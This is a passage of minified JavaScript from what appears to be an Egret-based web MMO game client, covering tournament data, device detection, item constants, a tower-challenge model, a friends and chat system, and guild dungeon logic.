t.prototype.readData=function(t){this.playerId=t.readInt(),this.playerName=t.readString(),this.job=t.readByte(),this.servId=t.readInt(),this.likeNum=t.readInt()},t}();e.PeakTopRankData=a,window.PeakTopRankData=a,__reflect(a.prototype,"PeakTopRankData",[]),window.PeakTopRankData=a;var r=function(){function t(t){t&&this.readData(t)}return t.prototype.readData=function(t){this.status=t.readByte(),this.playerId=t.readInt(),this.batNum=t.readInt()},t}();e.PeakBetData=r,window.PeakBetData=r,__reflect(r.prototype,"PeakBetData",[]),window.PeakBetData=r;var l=function(){function t(){}return t}();e.PeakBattleReportData=l,window.PeakBattleReportData=l,__reflect(l.prototype,"PeakBattleReportData",[]),window.PeakBattleReportData=l;var h=function(){function t(){}return t.prototype.readBFData=function(t){this.id=t.readInt(),this.player=t.readString(),this.result=t.readByte()},t.prototype.readKFData=function(t){this.id=t.readInt(),this.player=t.readString(),this.servId=t.readInt(),this.result=t.readByte()},t}();e.KonckReportData=h,window.KonckReportData=h,__reflect(h.prototype,"KonckReportData",[]),window.KonckReportData=h;var u;!function(t){t[t.None=0]="None",t[t.SignUp=1]="SignUp",t[t.Knockout=2]="Knockout",t[t.Prom16=3]="Prom16",t[t.Prom8=4]="Prom8",t[t.Prom4=5]="Prom4",t[t.Finals=6]="Finals",t[t.Over=7]="Over"}(u=e.BF_PeakStatus||(e.BF_PeakStatus={})),window.BF_PeakStatus=u,window.BF_PeakStatus=u;var p;!function(t){t[t.None=0]="None",t[t.Knockout=1]="Knockout",t[t.Prom64=2]="Prom64",t[t.Prom32=3]="Prom32",t[t.Prom16=4]="Prom16",t[t.Prom8=5]="Prom8",t[t.Prom4=6]="Prom4",t[t.Finals=7]="Finals",t[t.Over=8]="Over"}(p=e.KF_PeakStatus||(e.KF_PeakStatus={})),window.KF_PeakStatus=p,window.KF_PeakStatus=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DeviceUtils=void 0;var n=i(0),o=function(){function t(){}return Object.defineProperty(t,"IsHtml5",{get:function(){return egret.Capabilities.runtimeType==egret.RuntimeType.WEB},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsNative",{get:function(){return egret.Capabilities.runtimeType==egret.RuntimeType.NATIVE},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsMobile",{get:function(){return egret.Capabilities.isMobile},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsPC",{get:function(){return!egret.Capabilities.isMobile&&"ios"!=platform.getOS()},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsQQBrowser",{get:function(){return this.IsHtml5&&-1!=navigator.userAgent.indexOf("MQQBrowser")},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsIOS",{get:function(){return 1==urlParam.ios},enumerable:!1,configurable:!0}),Object.defineProperty(t,"IsLiuHai",{get:function(){return t.IsMobile&&n.GlobalConfig.ClientGlobalConfig.showLiuhaiAppid&&-1!=n.GlobalConfig.ClientGlobalConfig.showLiuhaiAppid.indexOf(+urlParam.appid)||urlParam.liuhai?55:0},enumerable:!1,configurable:!0}),t}();e.DeviceUtils=o,window.DeviceUtils=o,__reflect(o.prototype,"DeviceUtils",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemConst=void 0;var n;!function(t){t[t.RENAME=100]="RENAME",t[t.EXP_ITEM=200137]="EXP_ITEM",t[t.GUANYIN_ITEM=600005]="GUANYIN_ITEM",t[t.LEVELUP_ITEM=200155]="LEVELUP_ITEM",t[t.GOLD_BRICK=200164]="GOLD_BRICK",t[t.TREASURE_ITEM=200165]="TREASURE_ITEM",t[t.TREASURE_RUNE=200166]="TREASURE_RUNE",t[t.PUBLICBOSS=200156]="PUBLICBOSS",t[t.WORLDBOSS=200157]="WORLDBOSS",t[t.FIRE_FB=202e3]="FIRE_FB",t[t.GODWING_ITEM=601e3]="GODWING_ITEM",t[t.THANKS_ITEM=0]="THANKS_ITEM",t[t.SHENYUBOSS=200995]="SHENYUBOSS",t[t.WEIWANG_ITEM=200318]="WEIWANG_ITEM",t[t.GODWEAPON_ITEM=200333]="GODWEAPON_ITEM",t[t.JINGJIN=200332]="JINGJIN",t[t.SKILLEXP=103033]="SKILLEXP",t[t.CBSHOPITEM=103038]="CBSHOPITEM",t[t.BACK_ITEM=103036]="BACK_ITEM",t[t.HP_ITEM1=100010]="HP_ITEM1",t[t.HP_ITEM2=100011]="HP_ITEM2",t[t.HP_ITEM3=100012]="HP_ITEM3",t[t.HP_ITEM4=100013]="HP_ITEM4",t[t.HP_ITEM5=100014]="HP_ITEM5",t[t.HP_ITEM6=100015]="HP_ITEM6",t[t.MP_ITEM1=100020]="MP_ITEM1",t[t.MP_ITEM2=100021]="MP_ITEM2",t[t.MP_ITEM3=100022]="MP_ITEM3",t[t.MP_ITEM4=100023]="MP_ITEM4",t[t.MP_ITEM5=100024]="MP_ITEM5",t[t.MP_ITEM6=100025]="MP_ITEM6",t[t.SP_ITEM1=100030]="SP_ITEM1",t[t.SP_ITEM2=100031]="SP_ITEM2",t[t.SP_ITEM3=100032]="SP_ITEM3",t[t.SP_ITEM4=100033]="SP_ITEM4",t[t.SP_ITEM5=100034]="SP_ITEM5",t[t.SP_ITEM6=100035]="SP_ITEM6",t[t.CROSSDART_TRAN_ITEM=3241]="CROSSDART_TRAN_ITEM"}(n=e.ItemConst||(e.ItemConst={})),window.ItemConst=n,window.ItemConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkyLevelModel=void 0;var n=i(0),o=i(4),s=i(24),a=i(26),r=i(2),l=i(32),h=i(6),u=i(54),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.cruLevel=1,e.lastPass=!1,e.stageLevel=1,e.dayReward=1,e.rewardTimes=0,e}return __extends(e,t),e.ins=function(){return this._instance||(this._instance=new e),this._instance},Object.defineProperty(e.prototype,"lotteryRemainTimes",{get:function(){var t,e=n.GlobalConfig.FbChallengeConfig;if(this.lastPass){var i=Object.keys(e).length;t=e[i]}else if(t=e[this.cruLevel-1],this.cruLevel-1<n.GlobalConfig.FbChallengeBaseConfig.LotteryOpenLevel)return 0;if(!t)return 0;var o=t.lotteryCount-this.lotteryUseTimes;return o},enumerable:!1,configurable:!0}),e.prototype.isGetLotteryAward=function(t){return 1==(this.lotteryIndexs>>t&1)},e.prototype.getNextOpenLevel=function(){var t=n.GlobalConfig.FbChallengeConfig;for(var e in t)if(t[e].id>=this.cruLevel&&t[e].showIcon)return t[e];return null},e.prototype.getNextOpenLevelNew=function(t){var e=n.GlobalConfig.FbChallengeConfig;return e[t].id>=this.cruLevel&&e[t].layer?e[t]:null},e.prototype.getSkyLevelList=function(){var t=[],e=n.GlobalConfig.FbChallengeConfig,i=e[this.cruLevel],o=this.getStageList(),a=s.CommonUtils.getObjectLength(o);for(var r in o){var l=o[r];if(this.checkIsPushInlist(i.layer,l.layer,a)&&(t.push(l),t.length>=6))break}return t.reverse(),t},e.prototype.checkIsPushInlist=function(t,e,i){if(4>=t)return!0;if(t>4){var n=i-t>=3?3:i-t,o=6-n,s=t-o,a=t+n;return a>=e&&e>s}},e.prototype.getStageList=function(){var t=n.GlobalConfig.FbChallengeConfig,e=t[this.cruLevel];this.stageLevel=e.group;var i=[];if(!e)return i;for(var o in t){var s=t[o];s.group==e.group&&i.push(s)}return i},e.prototype.setCruLevelInfo=function(t){t>0?(this.cruLevel=t,this.lastPass=!1):(this.cruLevel=s.CommonUtils.getObjectLength(n.GlobalConfig.FbChallengeConfig),this.lastPass=!0)},e.prototype.go=function(){var t=e.ins(),i=n.GlobalConfig.FbChallengeConfig[t.cruLevel];if(!(o.ActorCC.level>=i.levelLimit&&a.ZsCT.ins().stage>=i.zsLevelLimit)){var s="",p=i.zsLevelLimit;return p&&(s=p?gettext("{0}转",p.toString()):""),r.TipsCT.ins().showTips(gettext("转生等级不足，{0}{1}级可挑战",s,i.levelLimit)),o.ActorCC.level<i.levelLimit,a.ZsCT.ins().stage<i.zsLevelLimit,!1}return l.FbCT.ins().checkInFB()?!1:e.ins().lastPass?(r.TipsCT.ins().showTips(gettext("当前已全部通关")),!1):h.BagCT.ins().getAllSurplusCount(10)<0?(r.TipsCT.ins().showTips(gettext("背包格不足")),!1):(u.Fb2CT.ins().sendChallenge(),win.closeTopLevel(),!0)},e}(egret.HashObject);e.SkyLevelModel=p,window.SkyLevelModel=p,__reflect(p.prototype,"SkyLevelModel",[]),window.SkyLevelModel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatFlag=e.Friends=void 0;var n=i(14),o=i(26),s=i(4),a=i(0),r=i(2),l=i(181),h=i(45),u=i(28),p=i(13),d=i(17),c=function(t){function e(){var e=t.call(this)||this;return e.recentList=new eui.ArrayCollection,e.appList=new eui.ArrayCollection,e.blackList=new eui.ArrayCollection,e.chatList={},e.newMsg={},e.currentId=-1,e.sysId=PackageID.Friends,e.regNetMsg(1,e.doFriendsList),e.regNetMsg(2,e.doRencentList),e.regNetMsg(3,e.doAppList),e.regNetMsg(4,e.doBlackList),e.regNetMsg(7,e.doAddListMsg),e.regNetMsg(9,e.doRemoveListMsg),e.regNetMsg(10,e.doFriendsStateChange),e.regNetMsg(11,e.doSendResult),e.regNetMsg(13,e.doChatAdd),e.regNetMsg(14,e.doRecentChatList),e.initRed(),e}return __extends(e,t),e.prototype.initRed=function(){this.allProvateChatRed=new d.RedPoint(function(){if(Object.keys(e.ins().newMsg).length>0)for(var t in e.ins().newMsg){var i=e.ins().newMsg[t];if(1==i)return!0}return!1},this.postFriendChange,this.onPrivateChatHeatClick)},e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){this.sendAppList(),this.sendRecentList()},e.prototype.sendFriendsList=function(){var t=this.getBytes(1);this.sendToServer(t)},e.prototype.sendRecentList=function(){var t=this.getBytes(2);this.sendToServer(t)},e.prototype.sendAppList=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.sendBlackList=function(){var t=this.getBytes(4);this.sendToServer(t)},e.prototype.sendAddFriend=function(t,e){if(1e3*o.ZsCT.ins().lv+s.ActorCC.level<a.GlobalConfig.FriendLimit.addFriendLv){var i=a.GlobalConfig.FriendLimit.addFriendLv>1e3?(a.GlobalConfig.FriendLimit.addFriendLv/1e3>>0)+"转":"",n=a.GlobalConfig.FriendLimit.addFriendLv>1e3?a.GlobalConfig.FriendLimit.addFriendLv%1e3+"级":a.GlobalConfig.FriendLimit.addFriendLv+"级";return void r.TipsCT.ins().showTips(gettext("{0}{1}开放功能",i,n))}if(-1!=this.indexOfBlackList(t))return void r.TipsCT.ins().showTips(gettext("不能添加黑名单中的用户为好友"));for(var l=0,h=this.blackList.source;l<h.length;l++){var u=h[l],p=u;if(p.name==e)return void r.TipsCT.ins().showTips(gettext("不能添加黑名单中的用户为好友"))}var d=this.getBytes(5);d.writeInt(t),d.writeString(e),this.sendToServer(d)},e.prototype.sendAddBlackList=function(t,e){if(1e3*o.ZsCT.ins().lv+s.ActorCC.level<a.GlobalConfig.FriendLimit.blackListLv){var i=a.GlobalConfig.FriendLimit.blackListLv>1e3?(a.GlobalConfig.FriendLimit.blackListLv/1e3>>0)+"转":"",n=a.GlobalConfig.FriendLimit.blackListLv>1e3?gettext("{0}级",a.GlobalConfig.FriendLimit.blackListLv%1e3):gettext("{0}级",a.GlobalConfig.FriendLimit.blackListLv);return void r.TipsCT.ins().showTips(gettext("{0}{1}开放功能",i,n))}var l=this.getBytes(6);l.writeInt(t),l.writeString(e.name),l.writeString(e.guildName),l.writeByte(e.job),l.writeByte(e.sex),l.writeByte(e.vip),l.writeByte(e.lv),l.writeByte(e.zsLv),l.writeByte(e.monthCard),l.writeInt(e.power),l.writeString(e.appId),this.sendToServer(l)},e.prototype.sendAgreeApp=function(t,e){var i=this.getBytes(8);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendDelete=function(t,e){var i=this.getBytes(9);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendChat=function(t,e,i){return void 0===i&&(i=0),__awaiter(this,void 0,void 0,function(){var i,n,o,s,a;return __generator(this,function(r){switch(r.label){case 0:return i=0,h.ChatCT.ins().isCheckStr()?[4,platform.checkStr(e,1,3,t)]:[3,2];case 1:n=r.sent(),o=n.result,s=n.content,i=2+("self"==o?1:0),e=s,r.label=2;case 2:return a=this.getBytes(11),a.writeInt(t.id),a.writeString(e),a.writeByte(i),this.sendToServer(a),[2]}})})},e.prototype.sendChatNew=function(t,e,i){return void 0===i&&(i=0),__awaiter(this,void 0,void 0,function(){var i;
return __generator(this,function(n){return i=this.getBytes(11),i.writeInt(t.id),i.writeString(e),i.writeByte(0),this.sendToServer(i),[2]})})},e.prototype.sendRecentChat=function(t){var e=this.getBytes(14);e.writeInt(t),this.sendToServer(e)},e.prototype.doFriendsList=function(t){this.paserList(1,t),this.postFriendChange()},e.prototype.doRencentList=function(t){this.paserList(2,t),this.postFriendChange()},e.prototype.doAppList=function(t){this.paserList(3,t),this.postFriendChange()},e.prototype.doBlackList=function(t){this.paserList(4,t),this.postFriendChange()},e.prototype.doAddListMsg=function(t){var e=t.readByte();this.paserAddData(e,t),this.postFriendChange()},e.prototype.doRemoveListMsg=function(t){var e=t.readByte(),i=t.readInt();this.paserRemoveData(e,i),this.postFriendChange()},e.prototype.doFriendsStateChange=function(t){var e=t.readInt(),i=t.readByte();this.paserOnlineChange(e,i),this.postFriendChange()},e.prototype.doSendResult=function(t){var e=t.readByte();if(0!=e){var i=t.readInt(),n=t.readInt(),o=t.readString();this.paserChatMsg(1,i,n,o)}this.postFriendChange()},e.prototype.doChatAdd=function(t){var e=t.readInt(),i=t.readInt(),n=t.readString();this.paserChatMsg(0,e,i,n),this.postFriendChange()},e.prototype.doRecentChatList=function(t){this.paserRecentMsg(t),this.postFriendChange()},e.prototype.postFriendChange=function(t){return void 0===t&&(t=!1),t?1:0},e.prototype.onPrivateChatHeatClick=function(){},e.prototype.postCloseFriendList=function(){},e.prototype.postChatToFriend=function(t){return t},e.prototype.indexOfBlackList=function(t){for(var e=-1,i=0;i<this.blackList.length;i++){var n=this.blackList.getItemAt(i);if(n&&n.id==t){e=i;break}}return e},e.prototype.indexOfRecentList=function(t){for(var e=-1,i=0;i<this.recentList.length;i++){var n=this.recentList.getItemAt(i);if(n&&n.id==t){e=i;break}}return e},e.prototype.indexOfAppList=function(t){for(var e=-1,i=0;i<this.appList.length;i++){var n=this.appList.getItemAt(i);if(n&&n.id==t){e=i;break}}return e},e.prototype.sortRecentList=function(){this.recentList.source;e.ins().recentList.source.sort(function(t,e){return t.lastMsgDate>e.lastMsgDate?-1:t.lastMsgDate<e.lastMsgDate?1:0})},e.prototype.sortAppList=function(){var t=this.appList.source;t.sort(function(t,e){return e.power-t.power}),this.appList.replaceAll(t)},e.prototype.paserList=function(t,i){for(var n=[],o=i.readInt(),s=0;o>s;s++){var a=new l.FriendData(t,i);n.push(a)}switch(t){case 1:break;case 2:this.recentList.source=n,this.sortRecentList(),this.postFriendChange(!0);break;case 3:n.length>e.MAXNUM&&(n=n.slice(n.length-e.MAXNUM,e.MAXNUM)),this.appList.source=n,this.sortAppList();break;case 4:this.blackList.replaceAll(n)}},e.prototype.paserAddData=function(t,e){var i=new l.FriendData(t,e),n=["friendsList","recentList","appList","blackList"][t-1],o=-1;1==t||(2==t?o=this.indexOfRecentList(i.id):3==t?o=this.indexOfAppList(i.id):4==t&&(o=this.indexOfBlackList(i.id),this.paserRemoveData(1,i.id),this.paserRemoveData(2,i.id),this.paserRemoveData(3,i.id),u.Guild.ins().removeMsgWithId(i.id))),this[n]&&(o>-1?this[n].replaceItemAt(i,o):this[n].addItemAt(i,0)),this.sortRecentList(),this.sortAppList()},e.prototype.paserRemoveData=function(t,e){var i=["friendsList","recentList","appList","blackList"][t-1],n=-1;this[i]&&(1==t||(2==t?(n=this.indexOfRecentList(e),this.newMsg[e]=!1):3==t?n=this.indexOfAppList(e):4==t&&(n=this.indexOfBlackList(e))),n>-1&&this[i].removeItemAt(n))},e.prototype.paserOnlineChange=function(t,e){},e.prototype.paserChatMsg=function(t,e,i,n){if(!(this.indexOfBlackList(e)>-1)){0==t&&this.currentId!=e&&(this.newMsg[e]=!0);var o=this.indexOfRecentList(e);if(o>-1){var a=this.recentList.getItemAt(o),r=new l.FriendData(1);r.id=s.ActorCC.actorID,r.job=p.SubRoles.ins().getSubRoleByIndex(0).job,r.sex=p.SubRoles.ins().getSubRoleByIndex(0).sex,r.power=s.ActorCC.power,0==t?a.addChat(new l.ChatData(a,r,i,n)):1==t&&a.addChat(new l.ChatData(r,a,i,n))}var h=this.indexOfRecentList(e);if(h>-1){var a=this.recentList.getItemAt(h);a.lastMsg=n,a.lastMsgDate=i,this.recentList.removeItemAt(h),this.recentList.addItemAt(a,0)}else o>-1||(console.log("有一个不属于最近联系人和好友列表的私聊"),console.log("id:"+e+"/ msg:"+n));this.sortRecentList(),this.sortAppList()}},e.prototype.paserRecentMsg=function(t){for(var e=t.readByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readInt(),s=t.readString();if(-1==this.indexOfBlackList(n))for(var a=0;i<this.recentList.length;i++){var r=this.recentList.getItemAt(a);if(r.id==n){r.lastMsg=s,r.offLineSec=o;break}}}},e.prototype.getFriendIndex=function(t){for(var e=0;;){var i=this.recentList.getItemAt(e);if(!i)return-1;if(i.id==t)return e;e++}},e.MAXNUM=100,__decorate([post()],e.prototype,"doAddListMsg",null),__decorate([post()],e.prototype,"doRemoveListMsg",null),__decorate([post()],e.prototype,"postFriendChange",null),__decorate([post()],e.prototype,"onPrivateChatHeatClick",null),__decorate([post()],e.prototype,"postCloseFriendList",null),__decorate([post()],e.prototype,"postChatToFriend",null),e}(n.BaseSystem);e.Friends=c,window.Friends=c,__reflect(c.prototype,"Friends",[]);var f;!function(t){t[t.Inside=2]="Inside"}(f=e.ChatFlag||(e.ChatFlag={})),window.ChatFlag=f,Systemap.Friends=function(){return c.ins()},window.Friends=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsBuffIcon=e.GuildSoulsMonType=e.GuildSoulsLandCT=void 0;var n=i(14),o=i(8),s=i(28),a=i(0),r=i(7),l=i(12),h=i(15),u=i(2),p=i(135),d=i(58),c=function(t){function e(){var e=t.call(this)||this;return e.open=!0,e.openTime=0,e.cur=1,e.challenge=0,e.guildInfos=[],e.monsterInfos=[],e.guildBuffArr=[],e.monsterBuffArr=[],e.logInfoList=[],e.rewardInfo=0,e.monsterInfoDic={},e.maxStage=0,e.closeTimes=0,e.sysId=PackageID.GuildFB,e.regNetMsg(10,e.postEnterSoulsLand),e.regNetMsg(11,e.postupdatePass),e.regNetMsg(13,e.postInit),e.regNetMsg(14,e.poststate),e.regNetMsg(15,e.postRewardInfo),e.regNetMsg(16,e.postaward),e.regNetMsg(18,e.postFocusMonster),e.regNetMsg(19,e.postGuildBuffs),e.regNetMsg(20,e.postGetMonsterBuff),e.regNetMsg(21,e.postGetMonsterChange),e.regNetMsg(22,e.postSweep),e.regNetMsg(23,e.postGetLog),observe(e,e.initActTimer,p.GameApp.ins().postZeroInit),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initMonsterList=function(t){if(!this.monsterInfoDic[t]){var e,i=this.monsterInfoDic[t]=[],n=!0,o=a.GlobalConfig.GuildAllSoulLandBossInfoConfig[t];if(o)for(var s in o){var r=o[s];if(r&&r.clientPos){e=r.clientPos;var l=this.createMonsterInfo();l.stage=r.id,l.monsterId=e.monId,l.x=e.posX,l.y=e.posY,l.desc=e.desc,l.state=n,l.type=f.boss,l.scene=r.id,l.index=r.index,l.cfg=r,i.push(l)}}var h=a.GlobalConfig.GuildAllSoulLandEliteMonsterInfoConfig[t];if(h)for(var s in h){var u=h[s];if(u&&u.clientPos){e=u.clientPos;var l=this.createMonsterInfo();l.stage=u.id,l.monsterId=e.monId,l.x=e.posX,l.y=e.posY,l.desc=e.desc,l.state=n,l.type=f.JYMon,l.scene=u.id,l.index=u.index,l.cfg=u,i.push(l)}}var p=a.GlobalConfig.GuildAllSoulLandSmallMonsterInfoConfig[t];if(p)for(var s in p){var d=p[s];if(d&&d.clientPos){e=d.clientPos;var l=this.createMonsterInfo();l.stage=d.id,l.monsterId=e.monId,l.x=e.posX,l.y=e.posY,l.desc=e.desc,l.state=n,l.type=f.mon,l.scene=d.id,l.index=d.index,l.cfg=d,i.push(l)}}}},e.prototype.createMonsterInfo=function(){var t={stage:0,monsterId:0,x:0,y:0,desc:"",state:!1,type:0,scene:0,index:0,cfg:null,hp:0,maxHp:0,killer:"",focus:0,buffArr:[]};return t},e.prototype.initActTimer=function(){var t=a.GlobalConfig.AllSoulLandBaseConfig.closetime;if(t){var e=o.DateUtils.showWeekLastDay(r.GameServerCC.serverTime).getTime(),i=t.split("-");2==i.length&&(this.closeTimes=o.DateUtils.formatStrTimeToToday1(i[0],e))}},e.prototype.sendEnterSoulsLand=function(t,e,i){var n=this.getBytes(10);n.writeInt(t),n.writeInt(e),n.writeInt(i),this.sendToServer(n)},e.prototype.postEnterSoulsLand=function(t){var e=t.readShort();switch(e){case 1:u.TipsCT.ins().showTips(gettext("挑战次数不足"));break;case 2:u.TipsCT.ins().showTips(gettext("玩家没有加入公会"));break;case 3:u.TipsCT.ins().showTips(gettext("不在挑战时间"));break;case 4:u.TipsCT.ins().showTips(gettext("有其他玩家在副本里"));break;case 6:u.TipsCT.ins().showTips(gettext("玩家在其他副本"))}},e.prototype.postupdatePass=function(t){this.cur=t.readInt(),this.challenge=t.readShort()},e.prototype.sendrank=function(){this.sendBaseProto(12)},e.prototype.sendInit=function(t){var e=this.getBytes(13);e.writeByte(t),this.sendToServer(e)},e.prototype.postInit=function(t){var e=t.readInt();if(this.openTime=o.DateUtils.formatMiniDateTime(e),this.open=t.readBoolean(),!this.open)return this.cur=1,void this.initMonsterList(this.cur);this.cur=t.readUnsignedByte();var i=t.readUnsignedByte();if(this.maxStage||(this.maxStage=Object.keys(a.GlobalConfig.GuildAllSoulLandBossInfoConfig).length),this.challenge=t.readUnsignedByte(),!(this.cur>this.maxStage)){this.initMonsterList(i);for(var n=t.readUnsignedByte(),s=0;n>s;s++)for(var r=t.readUnsignedByte(),l=t.readUnsignedByte(),h=0;l>h;h++){var u=t.readUnsignedByte(),p=t.readString(),d=!0,c=0,f=0,g=0;this.cur==i&&(d=t.readBoolean(),c=t.readUnsignedInt(),f=t.readUnsignedInt(),g=t.readUnsignedShort());var m=this.getMonInfo(i,r,u);m&&(m.state=d,m.hp=c,m.maxHp=f,m.killer=p,m.focus=g)}}},e.prototype.poststate=function(t){var e=t.readByte(),i=t.readByte(),n=t.readByte(),o=this.getMonInfo(e,i,n);o&&(o.state=!1)},e.prototype.sendRewardInfo=function(){var t=this.getBytes(15);this.sendToServer(t)},e.prototype.postRewardInfo=function(t){this.rewardInfo=t.readUnsignedInt()},e.prototype.postaward=function(t){var e=t.readBoolean();win.open("GuildSoulsLandResultWin",e)},e.prototype.sendGetStageReward=function(t){var e=this.getBytes(17);e.writeByte(t),this.sendToServer(e)},e.prototype.sendFocusMonster=function(t,e){var i=this.getBytes(18);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postFocusMonster=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readByte(),s=t.readInt(),a=this.getMonInfo(this.cur,n,o);a&&(a.focus=s)}},e.prototype.sendGuildBuffs=function(){var t=this.getBytes(19);this.sendToServer(t)},e.prototype.postGuildBuffs=function(t){this.guildBuffArr=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readShort(),o=t.readShort(),s={buffId:n,count:o};this.guildBuffArr.push(s)}},e.prototype.sendGetMonsterBuff=function(t,e){var i=this.getBytes(20);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postGetMonsterBuff=function(t){for(var e=t.readUnsignedByte(),i=t.readUnsignedByte(),n=t.readUnsignedByte(),o=[],s=0;n>s;s++){var a=t.readByte();o[a]=[];for(var r=t.readUnsignedShort(),l=0;r>l;l++){var h=t.readUnsignedShort(),u=t.readUnsignedShort();o[a].push({buffId:h,buffNum:u})}}var p=this.getMonInfo(this.cur,e,i);p&&(p.buffArr=o)},e.prototype.postGetMonsterChange=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte(),n=t.readUnsignedInt(),o=t.readUnsignedInt(),s=this.getMonInfo(this.cur,e,i);s&&(s.hp=n,s.maxHp=o)},e.prototype.sendSweep=function(){var t=this.getBytes(22);this.sendToServer(t)},e.prototype.postSweep=function(t){this.challenge=t.readUnsignedByte(),this.challenge<=0&&u.TipsCT.ins().showTips(gettext("扫荡成功"))},e.prototype.sendGetLog=function(){var t=this.getBytes(23);this.sendToServer(t)},e.prototype.postGetLog=function(t){this.logInfoList=[];for(var e,i,n,o,s,r,l=t.readUnsignedByte(),h=0;l>h;h++){var u=t.readUnsignedByte();switch(u){case 1:e=t.readString(),i=t.readByte(),n=t.readUnsignedInt(),s=a.GlobalConfig.MonstersConfig[n],o=s?s.name:"",r=d.LangUtils.formatStr(a.GlobalConfig.AllSoulLandBaseConfig.info1,[e,i,o]);break;case 2:e=t.readString(),i=t.readByte(),n=t.readUnsignedInt();for(var p=t.readByte(),c="",f=0;p>f;f++){for(var g=t.readUnsignedShort(),m=t.readByte(),v=0;m>v;v++){var y=a.GlobalConfig.AllSoulBuffLibConfig[g];c+=y?y.desc:"",v!=m-1&&(c+="，")}f!=p-1&&(c+="，")}s=a.GlobalConfig.MonstersConfig[n],o=s?s.name:"",r=d.LangUtils.formatStr(a.GlobalConfig.AllSoulLandBaseConfig.info2,[e,i,o,c]);break;case 3:e=t.readString(),i=t.readByte(),n=t.readUnsignedInt(),s=a.GlobalConfig.MonstersConfig[n],o=s?s.name:"",r=d.LangUtils.formatStr(a.GlobalConfig.AllSoulLandBaseConfig.info3,[e,i,o])}r&&this.logInfoList.push(r)}},e.prototype.isOpen=function(){var t=l.OpenSystem.ins().checkSysOpen(h.SystemType.GUILD_SOUL_LAND)&&s.Guild.ins().guildID>0;return t},e.prototype.isAllPass=function(){return this.cur>0&&null==a.GlobalConfig.GuildAllSoulLandBossInfoConfig[this.cur]},e.prototype.isPassStage=function(t){if(this.cur>t)return!0;var e=this.getMonInfo(t,f.boss,1);return e&&0==e.state?!0:!1},e.prototype.checkCanGetReward=function(t){if(!t)return!1;if(this.isPassStage(t)){var e=this.rewardInfo;return(e>>t-1&1)>0?!1:!0}return!1},e.prototype.getMonInfo=function(t,e,i){this.initMonsterList(t);for(var n=this.monsterInfoDic[t],o=0,s=n;o<s.length;o++){var a=s[o];if(a.type==e&&a.index==i)return a}return null},e.MAX_CHALLENGE=6,e.SINGLE_ITEM_ID=103085,__decorate([post()],e.prototype,"postEnterSoulsLand",null),__decorate([post()],e.prototype,"postupdatePass",null),__decorate([post()],e.prototype,"postInit",null),__decorate([post()],e.prototype,"poststate",null),__decorate([post()],e.prototype,"postRewardInfo",null),__decorate([post()],e.prototype,"postaward",null),__decorate([post()],e.prototype,"postFocusMonster",null),__decorate([post()],e.prototype,"postGuildBuffs",null),__decorate([post()],e.prototype,"postGetMonsterBuff",null),__decorate([post()],e.prototype,"postGetMonsterChange",null),__decorate([post()],e.prototype,"postSweep",null),__decorate([post()],e.prototype,"postGetLog",null),e}(n.BaseSystem);e.GuildSoulsLandCT=c,window.GuildSoulsLandCT=c,__reflect(c.prototype,"GuildSoulsLandCT",[]);var f;!function(t){t[t.boss=1]="boss",t[t.JYMon=2]="JYMon",t[t.mon=3]="mon"}(f=e.GuildSoulsMonType||(e.GuildSoulsMonType={})),window.GuildSoulsMonType=f,e.GuildSoulsBuffIcon={0:"SoulsLand_blu",1:"SoulsLand_pur",2:"SoulsLand_org"},Systemap.GuildSoulsLandCT=function(){return c.ins()},window.GuildSoulsLandCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MonsterType=e.CharMcOrder=e.CharEnum=void 0;var n;!function(t){t[t.NORTH=0]="NORTH",t[t.NORTH_EAST=1]="NORTH_EAST",t[t.EAST=2]="EAST",t[t.SOUTH_EAST=3]="SOUTH_EAST",t[t.SOUTH=4]="SOUTH",t[t.SOUTH_WEST=5]="SOUTH_WEST",t[t.WEST=6]="WEST",t[t.NORTH_WEST=7]="NORTH_WEST"}(n=e.CharEnum||(e.CharEnum={})),window.CharEnum=n;var o;!function(t){t[t.BODY=0]="BODY",t[t.WEAPON=1]="WEAPON",t[t.WING=2]="WING",t[t.SOUL=3]="SOUL",t[t.ZHANLING=4]="ZHANLING"}(o=e.CharMcOrder||(e.CharMcOrder={})),window.CharMcOrder=o;var s;!function(t){t[t.Monster=0]="Monster",t[t.Boss=1]="Boss",t[t.MonsterType_GatherMonster=2]="MonsterType_GatherMonster",t[t.Summon=3]="Summon",t[t.Ring=4]="Ring",t[t.MonsterType_Pet=5]="MonsterType_Pet",t[t.MonsterType_GodweaponMonster=6]="MonsterType_GodweaponMonster",t[t.MonsterType_Fire=7]="MonsterType_Fire"}(s=e.MonsterType||(e.MonsterType={})),window.MonsterType=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeCT=void 0;var n=i(14),o=i(6),s=i(4),a=i(0),r=i(13),l=i(139),h=i(22),u=i(38),p=function(t){function e(){var e=t.call(this)||this;return 